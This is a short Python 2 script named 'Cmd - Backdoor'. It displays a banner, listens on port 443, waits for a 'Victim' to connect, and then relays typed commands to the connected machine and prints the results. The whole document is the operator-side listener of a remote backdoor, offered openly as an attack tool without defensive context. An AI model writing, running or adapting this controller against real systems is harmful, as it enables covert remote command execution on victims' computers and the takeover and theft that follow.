from socket import *
import os
import time

HOST = 'localhost'
PORT = 443

os.system("title Cmd - Backdoor")
os.system("color 3")
os.system("mode con: cols=90 lines=14")
os.system("cls")
print "   _____               _            ____             _       _                  "
print "  / ____|             | |          |  _ \           | |     | |                 "
print " | |     _ __ ___   __| |  ______  | |_) | __ _  ___| | ____| | ___   ___  _ __ "
print " | |    | '_ ` _ \ / _` | |______| |  _ < / _` |/ __| |/ / _` |/ _ \ / _ \| '__|"
print " | |____| | | | | | (_| |          | |_) | (_| | (__|   < (_| | (_) | (_) | |   "
print "  \_____|_| |_| |_|\__,_|          |____/ \__,_|\___|_|\_\__,_|\___/ \___/|_|   "
print ""
time.sleep(3)
s = socket(AF_INET, SOCK_STREAM)
s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
s.bind((HOST, PORT))
print "[~] Listening On 127.0.0.1:%s" % str(PORT)

s.listen(1)

conn, addr = s.accept()
print "[~] Victim Connected ==> %s:%s" % (str(addr[0]), str(addr[1]) )

while 1:
    command = raw_input("[~] >> ")
    conn.send(command)
    data = conn.recv(4096)
    print data
conn.close()
